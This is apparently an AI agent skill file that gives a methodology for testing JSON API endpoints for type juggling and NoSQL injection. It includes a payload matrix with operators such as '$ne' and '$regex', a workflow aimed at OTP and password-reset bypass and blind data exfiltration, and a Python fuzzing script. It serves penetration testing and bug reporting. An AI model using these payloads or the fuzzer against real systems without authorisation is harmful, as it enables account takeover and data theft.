---
name: jsonjuggler
description: Use when testing a JSON API endpoint (REST/GraphQL) for type confusion, type juggling, loose-comparison, or NoSQL/ORM injection bugs — triggered by "test this endpoint for type juggling", "JSON fuzzing", "NoSQL injection test", or when mapping has surfaced an auth/token/comparison field worth attacking. Adapted from 0xSzit/json-juggler.
---

# JSON Type Confusion / Type Juggling Tester

Zero-blindspot audit of type confusion, loose comparison, structural mutation, and
NoSQL/ORM injection in any JSON API endpoint, regardless of method or schema.
Best targets: auth/login, OTP/token verification, password reset, search/filter
params, and any endpoint doing `==`/loose comparisons server-side (PHP, JS, Python
are all vulnerable to different flavors of this).

## 1. Payload matrix — mutate every key through all 12 classes

| # | Class | Mutations | Targets |
|---|---|---|---|
| 1 | Boolean positive | `true` | Loose equality (`"string" == true`) / truthy bypass |
| 2 | Boolean negative | `false` | Error-state matching (`false == false` on failed lookups) |
| 3 | Literal null | `null` | Matching uninitialized `NULL` DB columns (`WHERE token IS NULL`) |
| 4 | Numeric zero | `0`, `0.0`, `"0"` | Loose int conversion (`0 == false == ""`) |
| 5 | Numeric integers | `1`, `-1`, `99999999` | Integer casting / ID enumeration / index forcing |
| 6 | Scientific & floats | `1e0`, `0.0000001`, `NaN`, `Infinity` | Float parsing errors / unexpected coercion |
| 7 | Empty structures | `""`, `[]`, `{}` | Length-check bypass / ORM syntax confusion |
| 8 | Wrapped arrays | `[true]`, `[false]`, `[null]`, `[0]`, `[""]` | Index-selection polyglot / SQL `IN (...)` expansion |
| 9 | Nested structures | `[[]]`, `[{}]`, `{"":""}` | Recursive parser crashes / unhandled type mismatch |
| 10 | NoSQL operators | `{"$ne": ""}`, `{"$gt": ""}`, `{"$regex": ".*"}` | MongoDB/document-DB query injection |
| 11 | Key pollution | duplicate the same key twice in one object with different values | Parser precedence flaw (first vs. last key wins) |
| 12 | Coercion strings | `"true"`, `"false"`, `"null"`, `"0"` | String→type implicit conversion |

## 2. Audit workflow

**Step 1 — Deep payload mapping.** Flatten the target JSON body into every key path,
including nested objects/arrays. Example:
```json
{ "auth": { "security_code": "998877", "params": ["v1"] }, "action": "confirm" }
```
flattens to: `auth.security_code`, `auth.params[0]`, `action`.

**Step 2 — Per-key mutation sweep.** For every leaf key, replace its value with each
of the 12 classes above, one at a time, keeping all other keys at their original
valid values (change one variable per request so you know what caused a behavior
shift). Record status code, response body length, response time, and body diff vs.
the baseline valid request for each mutation.

**Step 3 — Flag anomalies.** A mutation is worth digging into when it produces any of:
- 200/success where the original invalid-input request returned 401/403/400
- A different error message than the baseline invalid-input error (info leak or
  logic branch difference)
- A response time outlier (NoSQL/regex injection can cause measurable delay —
  `{"$regex": "^a.*"}` timing attacks to extract values char-by-char)
- A crash/500 (parser choked — potential DoS or stack trace leak)
- Any content in the response that looks like it came from a different user/record
  (type-juggled match hit the wrong row)

**Step 4 — Confirm and chain.** For each anomaly, minimize to the smallest payload
that reproduces it, then check real impact:
- Auth/OTP/token endpoints: does `{"otp": true}` or `{"otp": 0}` or `{"otp": null}`
  match when the stored value is falsy/empty/unset? → auth bypass.
- Password reset token compare: does `{"token": []}` or `{"token": {"$ne": null}}`
  bypass? → account takeover.
- Search/filter params: do NoSQL operators (`$ne`, `$gt`, `$regex`) get passed
  straight to a Mongo query? → full data exfiltration via blind NoSQLi.
- Key pollution: does sending the real key twice (once valid, once malicious) let
  the malicious value win on the backend while a WAF/validator only checked the
  first/last occurrence? → validation bypass.

## 3. Practical execution

Manual, one field at a time, through Burp Repeater is the right default — type
juggling bugs are subtle and need eyeballing each response, not blind fuzzing.
For scale, drive it with a small script:
```python
import requests, json, copy

base_payload = {"auth": {"security_code": "998877"}, "action": "confirm"}
mutations = [True, False, None, 0, "0", 1, -1, "", [], {}, [0], [None],
             {"$ne": ""}, {"$gt": ""}, {"$regex": ".*"}, "true", "null"]

def flatten_keys(d, prefix=""):
    paths = []
    for k, v in d.items():
        p = f"{prefix}.{k}" if prefix else k
        if isinstance(v, dict):
            paths += flatten_keys(v, p)
        else:
            paths.append(p)
    return paths

def set_path(d, path, value):
    keys = path.split(".")
    cur = d
    for k in keys[:-1]:
        cur = cur[k]
    cur[keys[-1]] = value

baseline = requests.post(URL, json=base_payload)
for path in flatten_keys(base_payload):
    for m in mutations:
        p = copy.deepcopy(base_payload)
        set_path(p, path, m)
        r = requests.post(URL, json=p)
        if r.status_code != baseline.status_code or len(r.text) != len(baseline.text):
            print(f"[ANOMALY] {path} = {m!r} -> {r.status_code} len={len(r.text)}")
```
Also test with Burp's JSON tab + Intruder (payload type "Simple list" fed with the
mutation values above, positioned on one leaf value at a time) if you want GUI-driven
iteration with full request history.

## 4. Reporting
If a mutation yields a genuine auth bypass, IDOR, or data leak, capture: the exact
request/response pair, the baseline comparison, and a plain-language explanation of
*why* the server-side comparison is vulnerable (language/framework-specific — PHP
`==`, JS `==`, Python `in` on dict keys, Mongo operator injection, etc.) — reviewers
need the root cause, not just "it returned 200."

Source: adapted from [0xSzit/json-juggler](https://github.com/0xSzit/json-juggler).
